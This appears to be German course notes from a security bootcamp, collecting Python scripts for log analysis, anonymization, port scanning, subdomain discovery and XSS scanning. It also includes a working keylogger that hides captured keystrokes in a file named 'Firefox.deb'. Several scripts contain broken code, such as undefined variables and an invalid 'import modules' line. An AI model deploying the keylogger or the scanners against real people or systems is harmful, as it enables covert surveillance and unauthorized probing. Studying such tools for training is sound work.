## base64_encoder
### Requirements
- Braucht eine "b64.txt" 

### Code
### Import / Shebang
```
#!/usr/bin/env python3

####################
# import modules
import base64
####################
```

### File lesen
```
# Open a file
file = open('b64.txt',mode='r')

# read all lines at once
flag = file.read()

code = ""

for i in range(0,50):
    code = base64.b64decode(flag)
    flag = code

print(flag)
file.close()

```

## bruteforce_detector
### About
- Von Hackinglab Aufgabe [Logfile mit Python und im Terminal analysieren](https://siw.hacking-lab.com/events/4/curriculumevents/5/challenges/70)
- Scannt Logfile nach "pam_unix(sshd:auth): authentication failure;" und zählt IP-Adressen
- Wenn Anzahl IP-Adressen > Threshold dann wir die IP-Adresse ausgegeben

### Requirements
- Braucht ein SSH-Access Log

### Code
### Import / Shebang
```
#!/usr/bin/env python3

###########################
import sys
###########################
```

### load_log_list Funktion
```
###### load_log_list-Funktion ######
def load_log_list(filename):
# Oeffnet das File welches im Parameter 1 mitgegeben wude
    with open(filename) as f:
# Speichert die Zeilen in der content-Variable
        content = f.readlines()
# Entfernet Newline-Characters
    content = [line.strip() for line in content]
    return content
###########################
```

### main Funktion
```
###### main-Funktion ######
def main():
    print("[+] Starting Log Analyzer")

    print("[+] Loading Log-File")
# Ruft das File vom Paramater 1 mit der load_log_list-Funktion auf
    log_list = load_log_list(log_filename)

# Array fuer IP-Adressen
    login_failure_ips = [] 
    for log_entry in log_list:
# Sucht nach "pam_unix(sshd:auth): authentication failure;" im Logfile
        if 'pam_unix(sshd:auth): authentication failure;' in log_entry:
# Fuegt IP-Adressen in Array ein. Split beim "=" damit nur IP-Adresse in Array eingetragen wird.
# [-1] damit nur der letzte Eintrag aus der Zeile (die IP-Adresse) verwendet wird.
            login_failure_ips.append(log_entry.split('=')[-1]) 

# Sortiert nach "unique" IPs
    unique_ips = set(login_failure_ips)

# Zaehlt die Anzahl Loginversueche (Anzahl der IP-Adresse in Array)
    for ip in unique_ips:
        number_of_failed_logins = login_failure_ips.count(ip)
# Wenn die Zahl der Login-Versuche (Anzhal der IP-Adresse in Array)
# grösser als der Schwellwert, dann wird die IP und die Anzahl der versuchten Logins ausgegeben
        if number_of_failed_logins > threshold:
            print("\n[!] Brute-Force-Attempt detected")
            print("[!] IP: " + ip)
            print("[!] Number of Failed Login-Attempts: " + str(number_of_failed_logins))
###########################

if __name__ == "__main__":
    main()
```

## keylogger
### Requirements
- pynput muss installiert sein: `pip3 install pynput`

### About
- Von diesem [Link](https://www.askpython.com/python/examples/python-keylogger)
- Erstellt im Pfad /Users/Username/firefox.deb in welcher alle Ttastenschläge geloggt werden

### Code
### Import / Shebang
```
#!/usr/bin/env python

###########################
from pathlib import Path
from logging.config import listen
from pynput.keyboard import Key, Listener
import logging
import platform
import os
###########################
```

### Keylogger ausführen
```
# Fragt OS ab und gibt es aus
OS = platform.system()
print ("Current OS :",OS)
# Setzt Pfad zum Userhome und gibt Pfad aus
home = str(Path.home())
print (home)

# homepfad + /Browser
tempfolderpath = home + '/Browser'
print (tempfolderpath)

try:
# Erstellt Pfad für Keylogger-Daten
    os.mkdir(tempfolderpath)
except OSError as error:
    print(error)

# Pfad in welcher der Keylogger die Daten logget
keylogfile = tempfolderpath +'/Firefox.deb'
print (keylogfile)

# Definition des Logging Levels und Dateiname
logging.basicConfig(filename=(keylogfile), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

# Wenn Taste Gedrueckt wird, wird in das Log die entsprechende Taste geschrieben
def on_press(key):
    logging.info(str(key))

# Hört auf die on_press funktion
with Listener(on_press=on_press) as listener :
# .join -> Wait until the thread terminates.
    listener.join()
```

## json_anonymizer
### Requirements
- Braucht ein SSH-Access Log
 
### About
- Von Hackinglab Aufgabe [Bootcamp - Anonymization](https://siw.hacking-lab.com/events/41/challenges/108)
- Anonymisiert gewisse Spalten und gibt diese wieder aus

### Example
```
python3 json_anonymizer.py < orders.json > orders.csv
```

```
cat orders.json | python3 json_anonymizer.py > orders.csv
```

### Code
### Import / Shebang
```
#!/usr/bin/env python

###########################
from hashlib import sha1
import json
import sys
###########################
```

### IP Funktion
```
###########################
# Funktion für IP-Anonymisierung (letztes Oktett wird mit X ersetzt)
def handle_ip(ip):
    octets = ip.split('.')
    return '.'.join([octets[0], octets[1], octets[2], 'XXX'])
###########################
```

### Adress Funktion
```
###########################
# Funktion für das Splitten der Adresse / Gibt nur die PLZ zurueck
def handle_address(address):
    place = address.splitlines()[-0]
    zip, city = place.split(' ', maxsplit=1)
    return zip
###########################
```

### Mail Funktion
```
###########################
# Funktion für um Mail-Adresse zu hashen
def handle_mail(mail):
    return sha1(mail.lower().encode('utf-8')).hexdigest()
###########################
```

### File einlesen und Output
```
###########################
# Funktionen fuer JSON-File aufrufen und ausgeben
# Liest JSON-File über SYS.STDIN ein
for l in sys.stdin.readlines():
    o = json.loads(l)
# Gibt folgende Spalten aus: ID, Date, IP, Adress, Mail
# IP, Adress, Mail werden aus den entsprechenden funktionen aufgerufen
    print(','.join([
        str(o['id']), o['date'],
        handle_ip(o['ip']),
        handle_address(o['user']['address']),
        handle_mail(o['user']['mail'])
    ]))
###########################
```

## pcap_anonymizer
### About
- Von folgender Hackinglab Aufgabe [PCAP Anonymisierung](https://siw.hacking-lab.com/events/4/curriculumevents/35/challenges/80)
- Anonymisiert bei einem PCAP-File die Source-IP und Destination-IP
- Macht ein Backup der Originalen IPs in einem CSV-File

### Code
### Import / Shebang
```
#!/usr/bin/env python3

###########################
from scapy.all import *
import json
import csv
from warnings import filterwarnings
filterwarnings("ignore")
###########################
```

### Main-Funktion
```
###### main-Funktion ######
def main():
# Pfad des zu anonymisierenden PCAP-Files
    packets = rdpcap('pcap.pcap')
# Beim ersten Paket starten
    packet_nr = 0

# Durch PCAP File iterieren und nur Pakete mit IP-Adressen beachten
    for pkt in packets:
        if IP in pkt:
# Erstellt neues CSV und fügt beim iterieren die Originalen IP-Adressen ein
            with open('original_ips.csv', 'a+', newline='') as backup_file:
                print(backup_file)
# csv.writer > Daten als String abspeichern
                writer = csv.writer(backup_file)
# Paketnr, Source-IP, Destination-IP wird in CSV geschrieben
                writer.writerow([packet_nr, pkt[IP].src, pkt[IP].dst])
# Source-IP & Destination-IP anonymisieren
            pkt[IP].src = '1.1.1.1'
            pkt[IP].dst = '2.2.2.2'

# Printed alle EHLO Eintraege
        if TCP in pkt:
            if "EHLO" in str(pkt[TCP].payload):
                pkt[TCP].payload = Raw('EHLO [9.9.9.9]\r\n')

# Zum naechsten Paket springen
        packet_nr = packet_nr + 1

# Das anonymisierte PCAP File wird erstellt
    wrpcap('anonymized.pcap', packets)
###########################

if __name__ == '__main__':
    main()
```

## pcap_de-anonymizer
### About
- Von folgender Hackinglab Aufgabe [PCAP Anonymisierung](https://siw.hacking-lab.com/events/4/curriculumevents/35/challenges/80)
- Stellt ein anonymsiertes PCAP wiederher
- Bezieht sich auf pcap_anonymzer Scrip

### Requirements
- CSV-File mit entsprechenden Einträgen

### Code
### Import / Shebang
```
#!/usr/bin/env python3

###########################
from scapy.all import *
import csv
###########################
```

### Main-Funktion
```
###### main-Funktion ######
def main():
# Pfad des zu de-anonymisierenden PCAP-Files
    packets = rdpcap('/pcap.pcap')

# CSV Backup File laden
    with open('original_ips.csv', newline='') as csvfile:
        reader = csv.reader(csvfile)
        for row in reader:
# Paketnummer, Source-IP und Destination-IP Zeile für Zeile auslesen
            nr = row[0]
            original_src = row[1]
            original_dst = row[2]

# Source-IP & Destination-IP de-anonymisieren 
            packets[int(nr)][IP].src = original_src
            packets[int(nr)][IP].dst = original_dst

# Das de-anonymisierte PCAP File wird erstellt
    wrpcap('de_anonymized.pcap', packets)
###########################

if __name__ == '__main__':
    main()
```

## port_scanner
### About
- Scannt alle Ports von angebenem Hostname und gibt offene aus

### Requirements
- Benötigt pyfiglet: `pip3 install pyfiglet`

### Example
```
python3 portscan.py [HOSTNAME]
```

### Code
### Import / Shebang
```
#!/usr/bin/env python

###########################
import pyfiglet
import sys
import socket
from datetime import datetime
###########################
```

### Argument Parsing
```
###### Argument Parsing ######
# Es muss 1 Parameter angegeben werden
if len(sys.argv) != 2:
    print("[-] Require exactly 1 Parameters. Please enter a domain name.")
    exit()
###########################

# Erster Parameter ist Hostname. Der wird zu IPv4 uebersetzt
ip = socket.gethostbyname(sys.argv[1])
```

### Ports Scannen und Error Handling
```
# Neuer Banner wird erstellt
print("-" * 50)
print("Scanning ip: " + ip)
print("Scanning started at:" + str(datetime.now()))
print("-" * 50)

try:
# Scannt alle Ports
	for port in range(1, 65535):
# Erstellet neuen Socket
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Timeout um die Ladezeit zu verkuerzen
# Nur eine Antwort wird benoetigt um zu wissen ob der Port offen ist oder nicht
		socket.setdefaulttimeout(0.3)

# Gibt aus ob Port offen ist oder nicht
		result = sock.connect_ex((ip,port))
		if result == 0:
			print("Port {} is open".format(port))
		sock.close()

# Fehlerbehandlung
except KeyboardInterrupt:
		print("\n Exiting Program !!!!")
		sys.exit()
except socket.gaierror:
		print("\n Hostname Could Not Be Resolved !!!!")
		sys.exit()
except socket.error:
		print("\ Server not responding !!!!")
		sys.exit()

```

## logfile_merging_simple
### About
- Von Hacking-Lab Aufgaben [Un)Structured Data: Analysis](https://siw.hacking-lab.com/events/4/curriculumevents/15/challenges/34)
- Merged Einträge eines .log-Files und eines .db-Files damit es analyisiert werden kann

### Requirements
- Braucht ein log-file und ein dazugehöriges .db file

### Code
### Import / Shebang
```
#!/usr/bin/env python3

#########################
from datetime import datetime
import sqlite3
import json
###########################
```

### Main-Funktion
```
###### main-Funktion ######
def main():
    print("[+] Starting Log-Enhancer")
    jsonFileW = open('data.json', 'w')
    jsonFileW.close()

    with open(r'accesslog.txt', 'r') as f:
        for line in f:
# Funktionen Aufrufen um einzelne Zeilen in Variablen zu speichern
            session_id = get_session_id(line)
            remote_addr = get_remote_addr(line)
            http_method = get_http_method(line)
            http_uri = get_http_uri(line)
            http_status = get_http_status(line)
            http_response_size = get_http_size(line)
            timestamp = get_new_timestamp(line)
            user = get_user(session_id)
# Dictionary mit JSON-Elementen erstellen und Variablen einfüllen
            event = {
                "timestamp": timestamp,
                "session_id": session_id,
                "user": user,
                "remote_addr": remote_addr,
                "http_method": http_method,
                "http_uri": http_uri,
                "http_status": http_status,
                "http_response_size": http_response_size            }

# JSON-File erstellen (data.json mit append öffnen und json.dumps von event dict mit zusätzlichen NewLines schreiben)
            jsonString = json.dumps(event, indent=2)
            jsonFileA = open('data.json', 'a')
            jsonFileA.write(jsonString)
            jsonFileA.write('\n')
            jsonFileA.close()
###########################
```

### Zeilen einlesen
```
# Funktionen um einzelne Zeilen auszulesen und zu splitten
###########################
def get_session_id(line):
    return line.split()[0]
def get_remote_addr(line):
    return line.split()[2]
def get_http_method(line):
    return line.split()[7][1:]
def get_http_uri(line):
    return line.split()[8]
def get_http_status(line):
    return line.split()[10]
def get_http_size(line):
    return line.split()[11]
###########################
```

### timestamp
```
# Definition um den timestamp zu erstellen
###########################
def get_new_timestamp(line):
    time_str = line.split("[")[1].split("]")[0]
    datetime_object = datetime.strptime(time_str, '%d/%b/%Y:%H:%M:%S %z')
    return int(datetime.timestamp(datetime_object))
###########################
```

### session_id
```
# Definition für session_id aus database file zu holen
###########################
def get_user(session_id):
    conn  = sqlite3.connect(r'database.db')
    cur = conn.cursor()
    for row in cur.execute("SELECT username FROM user_sessions WHERE id=?", (session_id,)):
        conn.close()
        return row[0]
###########################


if __name__ == '__main__':
    main()
```

## logfile_merging
### About
- Von Hacking-Lab Aufgabe [CSS-05](https://ict-berufsbildung.hacking-lab.com/events/26/challenges/170)
- Merged Einträge eines eines .log-Files und eines .json-Files damit es analysiert werden kann

### Requirements
- Braucht ein log-file und ein dazugehöriges .json file

### Code
### Import / Shebang
```
#!/usr/bin/env python3

###########################
import sys
import json
import argparse
import re
from datetime import datetime
###########################
```

### main-Funktion
```
###### main-Funktion ######
def main(access_file, forensics_file):
  with open(access_file, 'r') as access_log, open(forensics_file, 'r') as forensics_log:

# Dictionary für forensic.json-Einträge
    forensics = {}

# forensic.json wird Zeile für Zeil in lines-Variable eingelesen
    lines = forensics_log.readlines()
# Lädt Zeile für Zeile der forensic.json in das forensics-Dictionary
    for l in lines:
# json.loads() Methode parsed JSON Strigs und konvertiert diese für das Dicitionary
      forensics_json = json.loads(l)
      forensics[forensics_json['requestId']] = forensics_json

    for l in access_log:
      try:
        obj = {}
# Splitten der einzelnen Felder im access.log
        obj['requestId'] = l.split()[0]
        obj['remoteAddress'] = l.split()[1]
        obj['timestamp'] = l.split("[")[1].split("]")[0]
        obj['verb'] = l.split("\"")[1].split()[0]
        obj['url'] = l.split()[7]
        obj['version'] = l.split()[8][:-1]
        obj['status'] = l.split()[9]
        obj['responseSize'] = l.split()[10]
# Zeit in ISO-Format umwandeln / darstellen
        obj['timestamp'] = datetime.strptime(obj['timestamp'], '%d/%m/%Y:%H:%M:%S %z').isoformat()


# Zusammenfügen des access.log mit dem forensic.log File anhand der requestID
        req = forensics.get(obj['requestId'])



# Split für Headers-Teil im forensic.json
        headers = {}
        if not req:
          print('Could not find request {} in forensics log.'.format(obj['requestId']), file=sys.stderr)
        else:
# Aufsplitten der header bei jedem NewLineCharacter
          for h in req['headers'].split('\n'):
# Aufsplitten anhand des Doppelpunktes
# (bspw. User-Agent:Mozilla/5.0 wird zu [0] = User-Agent, [1] = Mozilla/5.0 im headers-Dictionary)
            header_name = h.split(":")[0]
            header_value = h.split(":")[1]
# headers.keys fügt header_name und header_value in ein Array
# falls headers_name noch nicht in headers.keys (neues array für headers) ist wird der Key im Array erstellt und schreibt den header_value readlines
# falls der headers_name schon im headers.keys ist (doppelnennung) wird der header_value hinten im array angehängt (Bspw. so: ['www.hacking-lab.com','www.neueURL.com'])
            if header_name not in headers.keys():
              headers[header_name] = [header_value]
            else:
              headers[header_name].append(header_value)

        print (headers)
# Ersetzen des headers Teil im forensic Dictionary durch den gesplitteten header aus dem headers Dict
        obj['headers'] = headers
# Aufrufen der write_output_log-Funktion
        write_output_log(obj)

      except Exception as e:
        print("Error {} on line {}".format(e, l), file=sys.stderr)
###########################
```

### write_output_log-Funktion
```
###### write_output_log-Funktion ######
def write_output_log(obj):
  # The json. dumps() method allows us to convert a python object into an equivalent JSON object. Or in other words to send the data from python to json.
	print(json.dumps(obj))
	print(test)
```

### Argument-Parsing
```
if __name__ == '__main__':
# Argument-Parsing
    parser = argparse.ArgumentParser(description='Process web application log files.')
    parser.add_argument('-a', '--access', help='the acces log file to parse', default='access.log')
    parser.add_argument('-f', '--forensics', help='the forensics log file to parse', default='forensics.json')

    args = parser.parse_args()

# Argumente für main-Funktion
    main(args.access, args.forensics)
###########################
```

## subdomain_finder
### Requirements
- Braucht eine Domain als Parameter
- Braucht eine "subdomain.txt" mit Beispiel-Subdomains

### Code
### Import / Shebang
```
#!/usr/bin/env python3

###########################
import modules
import sys
import requests
###########################
```

### Testing Subdomains from txt
```
sub_list = open("subdomain.txt").read()
subdoms = sub_list.splitlines()

for sub in subdoms:
    sub_domains = f"http://{sub}.{sys.argv[1]}"

    try:
        requests.get(sub_domains)

    except requests.ConnectionError:
        pass

    else:
        print("Valid domain: ",sub_domains)
```

## xss_scanner
### Requirements
- Braucht eine [xss_testrings](https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt) file

### Code
### Import / Shebang
```
#!/usr/bin/env python3

###########################
import modules
import sys
import requests
###########################
```

### xss-teststrings Variable
```
###### Configuration ######
# xss_teststrings file wird in Variable xss_test_strings_path geschrieben
xss_test_strings_path = 'xss_teststrings.txt'
###########################
```

### Argument Parsing
```
###### Parameter Parsing ######
# Falls weniger als 3 Argumente angegeben werden -> Exit
if len(sys.argv) != 3: # f
    print("[-] Require exactly 2 Parameters.")
    print("URL & Parameter")
    exit()

# Variablen für Parameter
url = sys.argv[1]
# Splitten der Argumente bei Kommas ->  vorname,nachname,adresse
parameters = sys.argv[2].split(",")
###########################

# Beispiel-Syntax:
# python3 xss_scanner.py https://www.myserver.com/submit.php vorname,nachname
```

### load_xss_test_strings Funktion
```
###### load_xss_test_strings-Funktion ######
def load_xss_test_strings(filename):
# File wird als f geöffnet zum iterieren
    with open(filename) as f:
# Inhalt wird in die Variable content eingelesen
        content = f.readlines()
# Entfernt Leerzeichen und Newline characters aus der Variable content
        content = [x.strip() for x in content]  
    return content
###########################
```

### main Funktion
```
###### main-Funktion ######
def main():
    print("[+] Starting Scanner")
    print("[+] Loading XSS Test-Strings")
    
    xss_test_strings = load_xss_test_strings(xss_test_strings_path)
    for xss_test_string in xss_test_strings:
# data-Array wird erstellt
        data = {}
# Parameter Einzeln einlesen
        for parameter in parameters:
# XSS-Teststrings zu jedem Parameter hinzufügen
            data[parameter] = xss_test_string
# POST-Request (Parameter und Teststring) wird an entsprechende URL gesendet
        response = requests.post(url, data=data)
# Überprüfen ob POST-Request reflektiert wird. Wenn ja, dann anfaellig
        if xss_test_string in response.content.decode("utf-8"):
            print("[!] XSS Vulnerability detected")
        else:
            print("[+] All good. No XSS Vulnerability detected.")
###########################

if __name__ == "__main__":
    main()
```

## code-snippets anonymize
- [3_PROCESS.md](https://github.com/ii-nik/siw-facss-2021f-boot2/blob/main/30_Projekte/siw-bootcamp-python/3_PROCESS.md)

### anonymize with hash
- Anonymisiert Name und E-Mail mit einem SHA1 Hash
```
import json
from hashlib import sha1

# One entry per user
data = json.loads('[{"name": "Huber", "plz": "4711", "id": "1", "email": "huber@hacky.ch"}, {"name": "Meier", "plz": "3000", "id":"2", "email": "meier@gmail.com"}]')

# -----START snipplet------------
for d in data:
    d["name"] = sha1(d["name"].lower().encode('utf-8')).hexdigest()
    d["email"] = sha1(d["email"].lower().encode('utf-8')).hexdigest()

print(data)  # Kontrolle
# -----END snipplet------------
```

### anonymize with random
- Anonymisiert mit Zufallswerten
```
import json
import random

# One entry per user
data = json.loads('[{"name": "Huber", "plz": "4711", "id": "1", "email": "huber@hacky.ch"}, {"name": "Meier", "plz": "3000", "id":"2", "email": "meier@gmail.com"}]')

# -----START snipplet------------
for d in data:
    d["plz"] = random.choice(range(1000, 9999))
	
print(data)  # Kontrolle
# -----END snipplet------------
```

- Teilweises Anonymisieren mit Zufallswerten
```
import json
import random

# One entry per user
data = json.loads('[{"name": "Huber", "plz": "4711", "id": "1", "email": "huber@hacky.ch", "ip": "10.20.30.40"}, {"name": "Meier", "plz": "3000", "id":"2", "email": "meier@gmail.com", "ip": "50.60.70.80"}]')

# -----START snipplet------------
for d in data:
    octets = d["ip"].split('.')
    octets[3] = 'XXX'
    d["ip"] = '.'.join(octets)

print(data)  # Kontrolle
# -----END snipplet------------
```

- Komprimieren / Aggregieren
```
import json
data = json.loads('[{"date": "2020-09-16", "user": "4711"}, {"date": "2020-09-15", "user": "4712"},{"date": "2020-09-16", "user": "4713"},{"date": "2020-09-20", "user": "4711"},{"date": "2020-09-21", "user": "4711"},{"date": "2020-09-15", "user": "4711"}]')

# -----START snipplet------------
perdaystat = {}
for line in data:
    if line["date"] in perdaystat.keys():
        perdaystat[line["date"]] = perdaystat[line["date"]] + 1
    else:
        perdaystat[line["date"]] = 1

print(perdaystat)  # Check ob Daten korrekt sind
# -----END snipplet------------
```

### combine dicts
- Zwei Listen zusammenfügen
```
import json

# 1_IN
# One entry per user
data1 = json.loads('[{"name": "Huber", "plz": "4711", "id": "1"}, {"name": "Meier", "plz": "3000", "id":"2"}]')
# Multiple entries per user
data2 = json.loads('[{"id": "1", "url": "/test2"}, {"id": "1", "url": "/test1"}, {"id": "2", "url": "/test99"}]')

# 2_TRANSFORM
urls = {}
for d2 in data2:
    if d2["id"] in urls:
        urls[d2["id"]].append(d2["url"]) 
    else:
        urls[d2["id"]] = [d2["url"]]
print(urls["1"])

# -----START snipplet------------
for d1 in data1:
    d1["url"] = sorted(urls[d1["id"]])

print(data1)          # Kontrolle
# -----END snipplet------------
```

### remove mail domain
- Entfernen der Domain einer Mail-Adresse aus einem json
```
import json

# One entry per user

data = json.loads('[{"name": "Huber", "plz": "4711", "id": "1", "email": "huber@hacky.ch"}, {"name": "Meier", "plz": "3000", "id":"2", "email": "meier@gmail.com"}]')

for d in data:

parts = d["email"].split("@")

d["domain"] = parts[1]

del d["email"]

print(data) # Kontrolle
```
